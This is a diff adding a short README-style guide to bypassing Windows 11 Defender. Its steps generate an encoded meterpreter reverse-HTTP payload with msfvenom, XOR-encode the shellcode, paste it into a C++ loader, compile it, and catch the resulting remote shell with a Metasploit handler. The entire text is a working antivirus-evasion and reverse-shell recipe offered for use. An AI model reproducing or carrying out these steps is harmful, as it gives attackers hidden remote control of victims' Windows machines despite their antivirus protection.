@@ -1,0 +1,11 @@
+Welcome, follow the steps to bypass WINDOWS 11 DEFENDER PROTECTION.
+
+Step 1 > msfvenom -p windows/x64/meterpreter_reverse_http -e x86/shikata_ga_nai -i 10 LHOST=(your private ip) LPORT=9500 -f raw -o jod.txt
+Step 2 > python xor_encoder.py jod.txt > jod_output.txt
+Step 3 > Copy the shellcode from jod_output.txt
+Step 4 > In Evasion.cpp u will paste the shellcode. (char b[] = { Paste the XORED SHELL CODE };)
+Step 5 > Complie Evasion.cpp in DevC++.
+
+NOW OPEN exploit/multi/handler in msfconsole and give the necessary inputs.
+
+Run the Evasion.exe and wait for few seconds until your meterpreter session open up.
